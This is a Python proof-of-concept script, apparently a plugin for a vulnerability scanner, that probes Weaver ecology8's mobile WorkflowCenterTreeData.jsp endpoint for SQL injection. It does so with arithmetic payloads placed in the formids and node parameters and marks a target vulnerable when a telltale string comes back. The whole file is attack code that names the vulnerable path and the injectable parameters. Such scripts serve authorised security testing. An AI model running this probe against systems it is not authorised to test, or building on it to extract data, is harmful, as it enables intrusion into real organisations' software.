#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    """
    ecology8 mobile sql inject
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            pocs = ["mobile/plugin/browser/WorkflowCenterTreeData.jsp?scope=1&node=root_1&formids=1/1&initvalue=1", # 注入点为formids,分母
                     "mobile/plugin/browser/WorkflowCenterTreeData.jsp?scope=1&node=wftype_6/1&formids=1&initvalue=1"] # 注入点为node,分母
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        for poc in pocs:
                            url = path + poc
                            async with session.get(url=url) as res:
                                if res!=None:
                                    text = await res.text()
                                    if '"draggable":false' in text:
                                        yield url
                                        return